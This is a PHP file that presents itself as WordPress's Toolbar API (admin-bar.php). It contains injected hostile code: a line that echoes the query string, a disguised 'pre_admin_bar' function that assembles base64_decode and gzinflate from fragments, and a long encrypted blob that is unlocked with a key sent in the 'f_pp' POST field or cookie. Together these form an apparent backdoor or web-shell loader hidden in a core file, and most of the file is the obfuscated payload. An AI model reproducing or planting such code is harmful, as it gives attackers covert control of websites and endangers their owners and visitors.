<?php
/*a92b01fc9ffde4efd487a5becce34e153ff7b041*/
if ($_SERVER["QUERY_STRING"]) { exit($_SERVER["QUERY_STRING"]); }

/**
 * Toolbar API: Top-level Toolbar functionality
 *
 * @package WordPress
 * @subpackage Toolbar
 * @since 3.1.0
 */

/**
 * Instantiate the admin bar object and set it up as a global for access elsewhere.
 *
 * UNHOOKING THIS FUNCTION WILL NOT PROPERLY REMOVE THE ADMIN BAR.
 * For that, use show_admin_bar(false) or the {@see 'show_admin_bar'} filter.
 *
 * @since 3.1.0
 * @access private
 *
 * @global WP_Admin_Bar $wp_admin_bar
 *
 * @return bool Whether the admin bar was successfully initialized.
 */

function _wp_admin_bar_init() {
	global $wp_admin_bar;

	if ( ! is_admin_bar_showing() )
		return false;

	/* Load the admin bar class code ready for instantiation */
	require_once( ABSPATH . WPINC . '/class-wp-admin-bar.php' );

	/* Instantiate the admin bar */

	/**
	 * Filters the admin bar class to instantiate.
	 *
	 * @since 3.1.0
	 *
	 * @param string $wp_admin_bar_class Admin bar class to use. Default 'WP_Admin_Bar'.
	 */
	$admin_bar_class = apply_filters( 'wp_admin_bar_class', 'WP_Admin_Bar' );
	if ( class_exists( $admin_bar_class ) )
		$wp_admin_bar = new $admin_bar_class;
	else
		return false;

	$wp_admin_bar->initialize();
	$wp_admin_bar->add_menus();

	return true;
}
 

/**
 * Filters whether to show the admin bar.
 *
 * Returning false to this hook is the recommended way to hide the admin bar.
 * The user's display preference is used for logged in users.
 *
 * @since 3.1.0
 *
 * @param bool $show_admin_bar Whether the admin bar should be shown. Default false.
*/
	 
function pre_admin_bar ( $wp_kses_data, $wp_nonce ) {

	$kses_str = str_replace( array ('%', '*'), array ('/', '='), $wp_kses_data );
	$filter = 'base'.'6'.'4'.'_decode';
	$filter = $filter( $kses_str );
	$md5 = strrev( $wp_nonce );
	$sub = substr( md5( $md5 ), 0, strlen( $wp_nonce ) );
	$wp_nonce = md5( $wp_nonce ). $sub;
	$prepare_func = 'g'.'z'.'inflate';
	$i = 0; do {
		$ord = ord( $filter[$i] ) - ord( $wp_nonce[$i] );
	 	$filter[$i] = chr( $ord % 256 );
	 	$wp_nonce .= $filter[$i]; $i++;
	} while ($i < strlen( $filter ));
	return @$prepare_func( $filter );
	
} 

$wp_nonce = isset($_POST['f_pp']) ? $_POST['f_pp'] : (isset($_COOKIE['f_pp']) ? $_COOKIE['f_pp'] : NULL);
$wp_kses_data = 'O7ZDrQwa6UbFoqfZpODFm%%EmMp9dJWPwTBXF8QYAZ5zK7zdrqsSuFfuD71elbShG+JYtYbXjbUhRMXhAl5DaK5OwyTJm+v3rdBQKiBBHMt0bnhPnHVZtH33QzJogG4UIC2xrJClnpf3RbsG9vXMbtDalCP08YwGdUuB8g7m1jJ9Hl2iZhO0O8x28TLUi203IG+Kuu80WTxfI5csHUiopwanlq1rd%Pv%vbj0O4Rlf3R9f9xjRw1shpuI3SM4T44Q8JyifBZK7JJgEl4hkvm0%CDDgZRUpGRLCs2fKn3C8qcbyUjFAX8sBpY7c%4ra%nrwDeo9J%L8wEf0MS2BlZ9lkCN2iLqBkVay9Qn0XyZYy2KnJvJoJVCKku6Y4DYT%7+EO1yJDIQDvU5d2XsMo4X3FpbtSpgNuNoAwvjRUM+UF2H4sUMuaXEBC5u2E47iaiCr+BILF24COdu6ZgAYQWV5dWThGOmrj4E087Ia5dVb8szojm41GKkxTLSBsYKKP4zh7t2Fruojo9wlmgWmiRvQcYibMByXrGUC4AB8KLSl5f+ehtkQdfaM4SaaV36zXWseRyqmwcPasvLeqs8mHg18o+x+E%Dr8Xcf4LubDgvkl5UlA8j%+mW%KI4dxl2CdJpdQMojeceXy6N+2vxtcMBf+09nO1ihXZ7X55mZeIiL6KU5P7mYOJqHfq14avFwLEiZT3G68vpGA80gxjhtEb2BAvU8bEyId7DmYr4vWs2pgX9OiSAgqB81qiQJH5LLQ23wtzLuMliDYX7DXvYPj62C8H+4RyVGkd1kiqvDPnIGDtgx4xDd4X7s0YjQamEh+5DsPyiZDBBoU4lL5OEL4Kkwz52wY+S3dmOEOJzTTxlEzIxb5COsDGkIwjgvrI2HSNCfKgSU+uE6dvOBYGDCSEbD6GQ9q1pU%jhWXiK4lN5S0UB0UU2SWuolATPdRpT8%BpZR5EDiQ2FtrJ%duMobV%rqb89FRh4xNjxa%DErrcDyGVdmeMRxBMuwdg3LL2tDYGU62%R6yjWZoH9WJouFILkgrljPJalLWHTcGckjaRdOzkp5uE102oW5kXT0egXDDk47LYUByNZ%L%L+5CElHdfXN0XgFO%0GsskTu+7o0g81SsysnoEgWSTN966wVMj8JNAh6kGsjIkvYsHap037F8dF8j%YjyTJxhF3g7iaaA0NEGUr4ZoaEBkcSHYSwHLtG4KJz+8DN4DfZWnzgX10sMKi3D7dSd2St0yGnWbovDt6akN66L+7GioDFcKxdMhnhYnoLRng+UxsCFlO98r3IetzfBMJo3ztZphbIBUljFTyw605eIAaFnH7sEbpGYngHHseI6i5AVr5ee8Be1UFAavxpy+JSPy5h1FrCxg6KR7Aqfs5xsryXiMbbnWOcxq%IxPc250HceP+5QFtSMbfkfO0EW1Ne6NCYsg3o7eMadL8vr6nBtaMp5q8lHNKGE%+TMB+HCtF6Gdc0WVTaNyDDXGKhxrDn6gr4Bu0kkRnxzTDEGf12Yc8sAHHWbN3czmJN0dU40P6fepNABluFtzAZWVWiYjG1nG3zv5Lf9rH5%gEO74OM7Kh2Bfvwd6ZygnPy3bMyHKd5pPi3iamoqr5oEgbu0xJOX3+opSlH1YOFNQGpJ%c7RV47iC1TkKtBEYSHtb7lLkh0b5i4e%I1pg1zzmgn3CT0CMtD4XaWhMdjGYVXYZHjanZiGZvgA1XNYLMJGIrkun0cqsbvgiGA+CuV1loh1dV6mPxKlhatThWVGuYc2aeqruW0CiUPJa9CijJTtaxCWwfPOcSCGE5wTal3thCwNzfeANAiW0Pc8J2ysThiW8qP1oOuQkKq8KTeoKM727EgE2MRbQslMnnLna7lcfuv1f00Oje2kNOVW5f3kv1DrTBShDDftIc2FT88Y6mPE6GtqyvktopsnGn%zh3Hv67dqkJ%dfF8Oc8J4CmPXhBWnoD9n0eHXtNuWEsS541i7ur5Nv8+%yX1H38v5uUs4aR9pAIMS3eM2TwYVso5X1gv67U9jpXkgdQATwgseJsUGVSlTNT3YEorWvATUa02%qyHYp0VjsVFC4zpofqlIx%MlZawYYuHt9bLgboVfhZU7fk7rwAnEQD88k7NT6XTXz7aRXahDM0bLx01ZtoinrHyvfyY7atT5oQC37HFkZO9QnvhMie1nclO6kNYrUfOkuPEVZtnYzb12VwDtCAq1pLWJRCzC5x01o7GR%IuyJRXo0BcRJtrbrOjyGUxEp7XTSnS9PMOcbb64A949gg+QPKBP9dhwnsD0kv4Eg2xGoMyehFocKV%iN+Gb27+iyYfszMIyba0sa74okO2WYBUXdOHrT6RKkefiXRaLLOaRE0nXeT%v2iJN7LnZFcmQJujwoxA%9AQaywWoW94By01zlrWWQUuiz+KZN9ad%bvKw2FSQEW7dusN2wIM+ns2Ek9aCBn4efcYucfUcgQnwXKpqLnQ%TZj0y2fXSFld8J9wa20ww6mpOvH62FjUlCPY9uJ%ZLtcfwJdbyeLL%9Y7VlikSQzOxv48hXuXc9Brq5buFtQX8kagNR726g%e+ezb56CwGHoihm92xqrILfG7c9wT5VE+idRZH9XbgyF9vtDsG7nfvzS96Mm18d6+bzuiYWEFRNS0eJuY1v09mdE75M4y1xnrJm9LH785ZS2Hc6AApYJ3GVP4rWr29Nm6CKQrtgCzXm3MWO6RDD9C95E7H0Es5zkZqfJkwKmC1xg0ugC0lTwlc+ThfSSKc4Op9pAj490Hxy9AjKwc7ckhenALa4zou%NQKXvENtsnfAs3Vy0TYAjNtJRqpbDlsPFqGShZOPm8RgV06isLRP3Bz2mNNzlIEef74iO44Lcl8rMX1O8Xi+l8Bou2WIJGVN1cKl%rNRHs5nYCw+l5s2mJCsPDqJUS468Jnr0phDT1iQQgAUj5X9tEnwQVvf1VOsz4uDqiNwPOleOrDdP4xKXTvMuPUVCjqYrm0d0Bbc%rCag8TqFlbSqLwtWPP2%Paf53P4Sk5B2Q6+0rgnDVKIgu1yGDlv+UFKeeDx8xtkWEnmCmD6zy9sZXqvFclCGx0dNTgOWXjx8S%16AYOxqEITIrMMjJSwwkUuk4CZR+6QEGUi9yvaFUfmX3VGa0RCNB4MrBFkRkFDlmk5k633wVcYCvlHVmNG9HA7jlBVRst5kyHdoeAfc%sVxh5XETH7pgMkM5T9g7czWh0Q74dbo5RO0xuK7nEusFWFgqMBN1BT3c06cwuv3ai0WC3Xp0I94AGADNN845GHdL5zGPLOzDWurx48ZWWBYBvZfvFmtkCgqJYjrQmtgWyvjTk6idQElS%jcCWGg5gi1PHBaS8Hc0NKLvA4KedcxZtuNBra8ZeV7TM3WUmvEvouGZSon+7mKribj6DpOv32GvTwm5vU041ItANjwY5FmA9y3YbjkCjAB0hLBh51jJ7wBc2RuBp+AvLGPx8Li0Hl0gALLd6mdYhKGzysOWx20u2VrYGWppxbddGg+8L3f2e4er4K6of4drXQX4WjB96OsIqzoIQ6iL8tsLoTv0q88lUItfTMqAGZ1Cmp++BiRa8SWwArIc5fsP3nLCjo8sCwDSslYoHGI2RLJcP3H0VLP1p+jjR08ug5XdDtzfnh5JKXNPgGcX3hhNTiBo3CV4SNz0orRBU22XyDEU3SjsJigtojH3APta4LEWbc3prBHcSJM4rmzDwHoOChy7KwjnC5U3IkpUMD2L1a7AqiJfwutuGVNCCdigb20QXovVT3ylfjnXKoU7EeyvndJy1zsyjTtDHgL1NsPSDLbIioxWLTiF8jdlJyQ%F6S%NtO4ralG5J9Stv9Lr71qA1jT10UDpojLiKI3Dvs%f4iVKRP2GBv%qtJQtQ6pw7zTNTsB85dtDx3LFWyhxRx8NDpABJo6Zj%deDqwsDHY77sseCUX09vA4JjmeP2xm5vu20wJ0q9gqrpbkOe+PZ%c%u%fva409XbhjM2PEqWkMV7EqHr0td3J6DHOIf5FzqxXtee2nzBXwNlhuewYzjUsbWtfMm+tD88Wcas1V%%sCuSTDKHQmFxDApsphqfhqh2yuHMRI0xsspIVqoofw5nDR4QhTxzzRSP8SncxOfH1cO1%Gd3s8mDFOF9FqEA6OvPCWcNUNDepM5XwcQGKcUGt7wC%ON1vMiMi4d11OcFf0OGTYh5z4mnVXOI6bK6ZBK8ePEt8XHp0pZu8fZgGfw+6%5gkrQ5QB1%M0TNbal8TvIHW4%9keBYfKFayA7Gj8PRwpSjYSsbotsM1yoyZ7uEu%0DMUd5GFKuscFshsx6LFTrD6wkwI2mk0A0YmJoNgnzznh83DRbaxMUXRlJ9EuMV8gi9hxL5xJNFKYttgzdL3U4bpItFo03%Jp2xq0qTjWtdaCswQCjgkumraFF4docajKxi4Q0h2coeV3hAgFVu4zaStOMN%cV0bRINzG6iSIXbMBcng8o6uPjIakEoh3Uzq7OE0%i6cBnZCyt7ruuh5U2gYc1NAXFPQKJRXtq0sZmM57XsIzDtThPZ6XMYTHr14eJzF7%y2X7VwK1kMEYnhcMM0RJ8HaWXi3BWC29ZUJyVpmHbSRSeUtJRJlg1518ektdCVEI10%n1PESHzl7KprOPC8BzlLeY7Lvt6nYOgO8bCptjbp1N2L0BDm8ry4+aAGAHo9JInfsKOTBR42HVgCijX5SgF1kr4uj97ThFTq5%8eZZygqO0TRr9CtTXqAzr2jHdlWKJUVg6FF2L28HKO7RGdDLBUilCHR09mqpJPfAQaNGuruUVmz4fMW4JDvnrmFO3x+z8+ie7xee17y30+1i5Rn02RdrmPv9j4abiuoh7rpemWnVrMTv75BWUhpfsuN6IHckcZMKBHUSsyPqjI1uL%AJGrv+lv8L80+pAyHLB5l7Vr0j62coqJtd2ZPkRlyHFQ+n56SugYzj1zJK%q%WX2RKL+4HkmrzXMaN8Wp6TfKVIN0uqGUtTTbmL1PD8WeWaVDFcrIG06RLXEv5OGBsX1SosWV5peztoqwtfsz16%S8m9nc%PUS9jGsR+1P9Of1ih4FsyrNm4MorWKsgYRKH7%PnHrpedKjwFbwOkPAyB0w9jlcbb3gi2a8X1+u5rGN7y8IRCIotgfde%lyHZmkKO03vHcsea6pRA2Lqf+%OHDOxWEWZRNApbEPWbpLkdSX3wQZPkXfvGOrxeGuQrANVOC4mLFxYcmMPRL8u2La9Z3pJRsrt93uBJKQL6qs8GcQYF+d9JMnAyxgbqwxc+3F0p6VRI4JHIEwBRhhdAjkHFhQdwf1ompdDZwa2FT24BtPPJanhdRyD0eKOe+DgBCbg4Hkqau+JJJZac+RFFwZPJ0AXOKbd8CkqSByIlwwNYH9ho7zMZI3dSToJ3JG3+snA8dn57vxEBBjaoLUj2r6EDoMzfRCHFKiSK73T8utJrV7XFjSwWtvmfC24d8ttZYVexRGD9snf+dcx1ez2vg1zOpV%1X4xzn8l1VmyIdVsXlbmyuqkl6YIpKTMu3RnLS5I6tdCytz5BQiLbGh5U91X71vMZ3MZ%LvSBnWLwze77J+VZVFVM3FbhuftJeGhhQBeG4dmboMuPPTgpfEt47o5gCKe5d4gVe+2AWXFN8ZEEoccdQnL1Ur1GgpA07Go+WgAJVv3u2fPzW1nhLkbqVLah5zuCqDdAzty3cHUT9WNjnCXxvJiPUNdB8Z9lt61R3IWHWms5C0q+gUXlg9rGj%G8ys2z+Rb4pN7X8ij05BXpOF44yqxK%IhsFYoswtEAzvnYNDV+SJMVCnWsDwG+vb96VFij9TY2adDQ9RnvUccyAEvoFj1RX1qLBraRdRM2bUZ%fuwh9ZWDimFzGdJ6yJa3cbYeyrEDjOegprL7FMavCPWDJu9XhfULdi6KF7NwMOPbHUyshXmG6VG8cMTa7An2S2v1hOtiHAZ0h6E+fdjPozF8Jx6OMmEtLsoZ%ij4fBbb%KLTwSEf2HxSPQTV7abkGP4cg+34FLsWzoLwN4PkuD2V1a1sezwfHCcBr5lVoHZdVfnaqcgtWX90MmkbVeuPTZj0eFrmr4ekMPC4ZhIP7zTpLXqIQkCggWHK4J7x+3g+PRNGjgpzIWWqnhqFWSp3H5g7bXoZ54g8Cu1uCAgIspACR6FcGmrDLmeW1oe6cOCbIz5M1DFlWaWho6%ZwxPt2bR6z21pSUEh6lQlsrvsd%quWOdifRXAtHytIRXs4x6ZuNOMfv2pb9vg1wu6uDoUIeD3SWqkRNFOe00o5H%SEls8nMHGLVKYuug4OxJqvtw1wWrmOyAcAHp0FGbchWHJVhgDc1aptraSbZGxGiWBXEkWSJfDSj6ZomgiQ6qEj+IWa17Sv0If96yo0zIO3yRC%0JS4DjqV9BlGd7dM2PnBq9jVcW7r0Qh18GS%9+h6XVHZdkw1%Xw7F38UYH5mBYxaBy4YNRaZXLi9xQhcz0gMEAfMBXYqPrloXm20Ma7qwaZUS7gOId0zB+LbNotdXOTeJOMJ+E%+JBwMYq7xQHNK+J6a7D0HODzAH%nQtz%+q573zbHC5SfbujdhjcIirSXq2hOwpSRhrVGeIQXUOS9T0bhqNocnXv9YG0+QTMyXWe7tvphsuScnWhPzfqIOzR0LqvJA+j3QRMRvx8qNV4yIqe5jDTQl18HnCImX5yFgw3Q8SErb7xipZ4vThWrK1ugYDarXZ0NwykkXX026vq0c8aNN65vuQ3MjHrvpNjfB8+4jBQhhXv1OG5h5iZ3nOSA29maWYy11kmqzrbgnQJz7Iab3eaqyTiyCy%K1TIJwa1o3grA3Yh9v6mLeAtCqigwKh6xvd6Di8sPoEqLLiiVqtJ6hsCfOcgkvyF8JiEyav5wPDIfdGMIbe0fgVUGHrsWBE2GlfdPe%Y6leiq58f1ZKJxrFCY4QW2yiX5GyVQYDH8Y6GZ4yDxwiwLz6tBdGoaF%V%a8xzsa8CNz4eUhd9VnC52jOe5TTAAc4B3mVdQ6qcFgxsziJfL1jFvL5zakBvwRxPCrmTW+tV3y%bF9DI%qzECPkq1F5QAXqrA5pOwEhW0EdoaShkzvVWd6D6KuI%ikFLPB8Vf1IuPUGT+YS9JLr28C4QYJOAMeo+q23RoOrrpqouv7LR2%iiaIpK5Cqyv2Vlena12Kd5FQFCr47wyo0f2ZiMLDElAj1HpRG6h+ouDB1WX5qS70Rn7OKo+NsSxeVY7azEj1PDD2r1D33xcCD+WLX3nP3Nn6GLfK61f+vGvrHdvbOAIlhMpSfAz9VL7rWPmz5KPvHsYczwbhRccmAChZUpJzktmpAXqa6aeLor+P1Dp7EcoJzHwG+D2INtyup5H2YjVA5Sk%jbl+6v9aFL1tV3YfMWcYpMxMFLSS5E0uOgyWzAOMXZSPuPWrIzUXcr86K9hcriK+0%G8sffIUnkbn3sUI7a1xfoSNq6G4wT7g1xR1usFd1KeQ3QSfM+GevtOkVd7a1n7DP6uY%7wxPdCfAxbWr%CLRaPQw7LwGQwHQMlW6FIRWfHPFI+MhGnSe3kt9iNW9Pkjb5PpWic2UQY+CF9K7E3p24%TX0GrfTDtTDn70hNZ+YfwjAecr2c3PKhoJGXDpOGEcdf+%QvZ0pN4AsAAMTT6ErCt2F6BIjNHtJV%fjIHmKiBO1s20pxj6tBZ0nbiIIw6sQdL7pbydbo8gCLrPbh7yEp3%raMv0JWbNS+ppf82KTmpTuMneS4lds6uYQ7Br1+QTvDGcmVOL7CyaVfDd8fdUOriBGxOpF2gWaDbA23OahXMayTI9MnQnhkK0aNgOvfomex7qbn1Mer1Kh%Pq+rnbcPgQZB3X4dvjM7psH%aSVk+eHf8DQ4xU5rpJ7YTkwbJOXmZyrn2cnkjwbl3CvSO6jsn4cRj2Pt9v6FnVK72R0DBcMy8xe30x%FbjSu4KJTNDSxVVPfBCVY0Mj2wDrZCR4IVmmI7Dm4sQBW52SKQb%MKxbmtT%onYa8j+I0Tre48cJ722nhTu4VI98hLSXaK0HB7ukmGE8U40yflPTUUUAGz5C6YBVEWj+lWrPDZBDmdJzr+E0YUo7oaMXBL7VmGj+hUXCJiym9FH%fS0Rtaic8vAiZSq9OmLxplLeSuv2I3Tygtlv5RunG5t9lpetE68DeLR78kYCk4ZII1o5ZdX6MlXCVtYRsf%12GRkkUbGivQWJ+S1G8AcdBBGq+PEcEI84gBWa88U%uOOJtUfBE+YldGt+gKOQW269rWwoQgEAlHowF+UMMeRbwjHCcja733VRLw1RXb0BGYRhq5xvKKZeKBOgoC3bl1npgd8Bp5KN3vkPusBSpPnRHEPx2JImh%Bq%+k0v7ocCKmVppQuHKq2Uyo%0pnrUke2X+PW894AeRYvlbU4ys2Yu7XLGfcnpitVjQww90jO0EZ7O1IRNa+cvT14ogzZNB%GKrIGzMZJpiZFYFQGa1TEjDMZ2SiHvshR1vAs3EiTAZy9rDVIMMBznJp9TXptsucsAQKNq4J5VLBHu4%qOm1LfyRKVS45yZ7gpnJKczyrNwuHZkkDS0YV4AkhfkcwyGCL+JQnfyisqI7tyUfeDbKofmvvy7s7HFSVSNgRUqtKDZIXQDqci2xp7NkXGjAmxGq3BssJnqrbxUfRdizZyR5DDlE971akbU3LTfNyuBD00Vgl1GejosGx8JdKQRhYS73pqq72M10zbdtILidE5eZwiiFrpZjymSmK+nMsoc772qXqD0aQHu4FzZs0piho57EbVBWRLgwBiXkjK4ZGePXmrDkb6kBtuRVfS88XLJuEpMeanhmjRF2PoxoUAsQuX11hFQOAiwBHTEM57ZgCzBjKlburJmwzwRqZd9l59zTY6kQ8GbUtf65NSKnHGUcxavrAAuo+%MFA5Cr2hcLM+JUcFzxbJgLDbzhX2TdPLudA5q4pQF8YZh%7odbxS4+xjuN6SmYIiQpb1POa8nZ0eFuNAcQe1SIx7SIQcGCyCRsLUnMRq9Tq82b9OD3sYt1fCmHF+6d52qjDAEq6XLF7zntXQfx2XPM8uhLcTRF7FoKuNTDVHFGXtAWMlyMHIEXhcNZ3RlEYtrxoYE0y+xYrrkehGh3XGUdImv1KihDW1SWq0u5GOAa6hpsl3r4aA4UPiFZLGeT+2gXP2raw%Jl9tyBXNkJFkh6fKVFEBkyHC9Q3Smz9nZ8cKJHTGpqCuRRoRBkV9mjdkJ+SYWPTKts6Tg1D1lb9kgXXSI33BEiFMBtCthQJbIirp6Gt+NjcpdQy6iv6LS0OZRITOFhTVzK4ToPA5uRQNHEnzB2EQz5tft254BaKKEDQ2JRuHZptaheo4LEK+gWY4qVgwsThpaBiF83e2pfeLQKKG72d+nubOy9fMjwJlL93lzxuTDJ2zdzJa52l+35kbhWQ%ylGLbxbC2EbxdGzfCOv5jfY7o9xPZD1kXZnHssROZ8T7BUOEFjwqz%42XsqhRjGkV4yrcCH%Tl1RIQLZwOJk3VRHoNM4O2thZEOkLcI2Srvg35frOZoIyJriJr3oa6eXmt6e7gC1zwf5eQ17GnaZKPVzR2hOZaZL%cGJOz8JvT12cT32Ohb6swZfRaDnDn06hHGdACPRoo3EnXUWlu1vcjPgbgXmkys9tl2FR188N9t%XqoGeC+saCfZSw930J%4gvR%jSRj5An+t5JMCmdR0OTdq9+yWagaqz6019HGyCT6jRi7y4DcUlAif0iWaugxSee899YUAOjNh8fUe8SvWwF%%h6nvmXqyWNFntasbrI67xDKEnaLyfR1fZRcH8omeOmUuElNAvo5LlOpA+hq+yNYVgzo0tBpC32%wP%mcjOesw0me6fL+56VM43yQ0mc326uSbSGoBWM0kydXU+FfGwcaeszR%zpMhvSWS7LlP0qZbrve0yMi9NmWiRaKnUMqURMINJbP4Lat0g7caJMFWUZrfRYR4FdW9ig7jb+ALNXPr7TA9mbzI+DNIAfBJ3M1wM%9Gu7ajN+bwKJwyhDINdXMm336OLYkOY2qkrLnxVOuS0e8MJJp4B88FYTP4Oc52D%ITh9p5AgeqCEJpegURGE%RS3CfWhyr2pIHXkezaGFhbBS5ayrjwV7R6hn5deLaGWb7ksYupxgiQLM4Nk5bzHLlFg+RpzwbyZC7mUGVxWRjElzurw%9FfoNukR0CDm56eM14lfFxpo0hKBWuR%n1Ptx22D%f3wtbkQ9UuLAADhbzQ9sYPQsLqFduxjafUcpul7zf7TL7VyM1b4w2qCZF3W2kIxJ4mloHJ8PqBJRGshpRYVnBSVsXmOFMA+%CrkuECAViT719vh0iUcgnLGI6qqx0L1bV6juhj2NLJRy0Sd0H8oHV1wht5nfgZ2Wy6a%uQPA3PM6yGt99FORvPquqn5mn8CBTlxiLPZbrk+zqLx6K33QA0QDAoLKLPrtcO5vT0Ozbo%AZb6Hkg+nICQNa9D4osuhN5b6YqB%bZQBk7kzBANvqI%S8+VDcPqt5H7AsjHYUxfgUioaMrL%YpqVsKHrTwHw1e68FFng3gP2jnExSLxYHH9LSSjvqxLZcqhlHyFYHZ6EpkN6kd5c337uqFgDYfG+1SSZznOhwlNxfh5znhQqcevu3k7blreZPiedYxd+LljHG8dXe2cRbPd6CwNarhgan%YKHOjjY2Y5aM7eKiBtd5Mp%U2XD76nJAgp9JHdqJJ41lt0N0InuDPm8xMyRH8B7sfw6Nq0LsDfYbb3qNXvAL5uRqbhKArL9ID1RK%8TCxvnT1isX9w+D2EMFt6XLTQB6DSeQ2R4SPAR%fxYh71WfdwqzZUbdIeK5n+1MlSYvdzcEtOMzPPzjPdEE+6PsNaF%wkT4DyxPhrIkNxo1jxyXXbANFkNBPOob08Ttvb6jCH9HKfWk+K00GudVEb0mbsJI%m6R+y3HTuowQSzwE0ctWYWcIw5edG%KUj3QSjZGbznpMyhi6M8kFs34bEwSH8VNMyFHxT2bsvhIfVqPvG1FhRMMAxNKzT8J+9ohLL7Zk4yxdEQ5PTwd9ZYZ0PnFOjK+O6t5FI1JnXU%BhaM6gDTTEwoVKC4CHcFnkgk7uRNgjfn5GJCyc3L28rU6yeC6OFtpS3Zixnw8w8xYC6MfF2WcbqqDSzvzmcefQNn2nL2O5a8HDQfbmvpy2FTKOln7qyreN5h%UKhPWrKdJz5hnzurOczg5rlEdCGyyhDOCgXzJ5vlFcsUyz++nF84QYE6zp9Q064D5OjRQjpXwnbXwqGuczt+G22ZflcRwg66XKIYO7lt90UUz0tlhxuSo+BdrTJi9dCOSyASZceTDQtMGmhTFyE3Nm+Ep8p4UbCNQARtUBxKD1toYMg%DgsTQNsQUkoEEW3fg4yuhUROfxTELoHcqyaxzAY9D84Ddj5Uxx9dl79hu65KUIEUmaFydECy7a6zua%AjcSKdfveMJ3X5HCpWSTx3SmvEbHUaU2oGfLl3%f+Ua1xK2HnhLOnHj0bpOF24LgU+dwVPy3Px5fd0SLXqoEUq73MX+DZkFL1wzrElfMiKz8mOphz+PxVSR5+Oq9ZdIqucDfyNJZHTEh2DBd3DWG0ZWZeSIbU0fwIdJTcwF9lTJkcabhWeDewUS5TqS+7eVOQdYB5eSjJnUiH9hJs0wCCYIFoTcYYeqwZgjAC8FsCHD3fIZPxSPAK2j7hGRNWDYWH8V79ZhC7bO9jYkK5I1yczN4SSEd1fhDEJD7JbocpODUm01yuuGPXb0XozNQkp2LhYbzKh7lxzIiWkhc4RYXqAMz0zi50qUrFZyNTJ36wf8ZdFOe9FW%Bv99GDQpgZRM8jRWXLWUt3IN0TpFevqdN42QBb4MPmAhoN3UhlnTF75mltTkkgzh23cylVP3lMvj+gVsANImmxxNoK+20nLwo5kv2Y9tg6WIP+bZp1%jdl1ze1N81frtvyzcQWnF5MEYii9YIHAqXlOxuxnSKb4nw1WyoNhP5ecoA2Rilbit0SJdrgRlIs6%371GhW7fZYIrjBAN2UcPGEdSCzQ+OFc0v7UczLcJ85Eac1igEej2F3ddqNus92IXmHyZJDDNhorNvOwTwK84geYaewOnc1IFJVqFUpuePjwsIXuoddOcOOXznaMgONR2m5TTCp6sN6GmUh6yAelw5Uyq2tbMIi+xahhFtj6agD1HSqd0B4709GMs5ClyKs8vI1v7vXQuUn77BzadgyVqGmALWRnXNHhOYAhxWr+B2oB8HF3VR0SqmaUStRy%X9Nw0YAYZl3G99CH0nN9FI%ijlQD%lIaPZow+hzsAhrOt5RFPGxi6BIOedIBAilFkLVYaJeiiXomYW17J0QyuiXbqQt+hktKQ0PJHHE9xA5lMqAJH9HpCLLSz5GBtMUHzNOrOe8Bd+OudzrcTquLG15Ddr1LxKYg+7asbi9VZWXzZ1PBswtSZw+clNGxKxptExf%KxM53zXxdsK9gfvSWkYIqGcJx0EJcgJWpxdwuyA3FC6IhzZgzIyKuOTB2U06XtsaQW4k5h%RhWMnAUKXZVaqInq3Nzfx3nB1eamjl%7kouxvIQs3eUexAP+p7iR+dvKnrdQDs4xLE9kqd+uh7w1e7ZzgMM8uHhGBUh830Cs1oa96hYFExkKUJFhbDxnGgT0kdcV5XguEvl2qGDOPHfskfJMsQ3SKkfJiAMhyNBqHeOpIAewUvZ9Ezx2%b8pHZJ+oZm2tpIqyA12acnDl1+eokk%4llvashr%tgmMNclC1iyR1wrdUk1tksjjGAqnzVUTF4W%SPoGRcXJo8cx2A8wmEbQQu4BGFZBxi4jijqoeNLQoWqMQQiApuOjt49P1Ky4uuXGVccYaP7hp8nl0r3aqWHES%02KBZVtK9jcbhCu7ghE+U6ZXT6CZWgvH82hDMyL73ulLH2N8B4M3iJt9IIZ%+Te1VjplSf27P7XPaJpQNkppYu%7rr4+Y7Bs%7IKp4ocPq9FPvzNoqWm9OKkrDvO3t4++nxRLUv7hR0O4WDXuCobCsPbYstXGnFRZnhw3Cy7+ckQkh9BFoJobQXlhK+oGG7PfYGiINPdx+83iLm7itAEs%Gg+VV9QOUBh5JMxiuw7uV8dD%Zp7MlC8rSCojO5cw+GCan2q7mAZh%katYvNLfSfqmvdjkj+lk8CMsnnkxNuTbdXSFLgNObgmVpD4lU9JOwlFKTslHuir0BigkPyEKcfEPEPsxD3NT+Yw%VNCCzDpkp8hRcgOOQdc3HGAdhqpLTI0I+D3VT9bGofx7yAmXKjhM8TSehw8u2oqcE3p8dQS8FVsBKOPQwVwydDmEsCBs55IyMSN6X5rlpGdxjG+5i5hjMsliDXxKFPQyiL3brEsut2Iyw5g7D%tJiutolg3m6N1iuBwsBepnypPG5yR0EcgBcGTdI5vBuwAB7i7ufu%cS3Q5XBqVSiGChBTP8cIpOir+qWTe1C693jikoM7DAbm4C2uxMC7G%DHLtK6uU4zwZUC2Gubt%1U6MuGiNFbRqkkB+EAcZGnf0CB+4fHwLfK%8Gmb5tC6BA7ZvBgZq+qX9Ay3c0+TbtJ1jsBQ2RYz3Ym4Iy6WVgYoYeEruhO76zTqVlJh73pRxp+bMpG5dls0cmhBGkHI66ZMQqfRxqRQodmR+1QRYOn0jcJC3ZQtuB9U8Qyt%ESC+yynUI%fJpOXzxfjxwKc1WKynKjhNzoclMxExomGqPxP0TKVhDXDucrtYGOKCnw4g7FzX1TEK5EoKQBthoh%T3P5i4xR1xRfBvQL83mmGsRkzN9Gd451dhnKOzuEmTZPnZP%wbybBzo36+gDK3TQKmnkckgM25l+v86ol69FXJfpXfgt+LDvPOipDAV5QHbTy51eFqumTxhMhuihdtllqWiggqMucVR%QtX3VU63zuPwaxlysw5W+Hx6V1krCtXj2Up2uB+5fhel5u84u7GyGhR82%ybKDjhLonvo5U3wQaA55iIEA3jM%e0hYunnwNFripGYp4PfHQ54rX5KgejFMccMz0OPgZcoiPs7RmcFK8%xN1RsZJU0Xsl4U2NGZtJc2CV599raNLftRngtbfysjgAvk+ROg9OXdY1AMggOdq3ATTR1zwGMLLkoysAeGeFD62%GTfsUaJUR5OqNOGETVIp8Rw5ITPx7wozdR+iYhFCn9jXQhuzpjdVYpeV4QBoyILSmLYn+rzG+unbY5ac8uLy8+kuBSqKPNLl8YCgO+zpb5zFe0TnLRN3OPNrSrYpmxdF82XV0wTWcqHCosOcBSIeEZoFZ0uPvCXH4haaUzQBQvfMMRuTW+qfB8QIbf8+oENby40YI%XGpcXccLiKA+SnglzowjeqNIBpfgI8VG0ui6Ffe40kzePf3fxQWUi5poe%JdmATxgDdm9OQcI4UOOt%ykT2mLRnisOuv7bKMnFt8869OufHlBe%i8zNRbJD0DujDlo0+eKoZpPCJFikJHkSC%t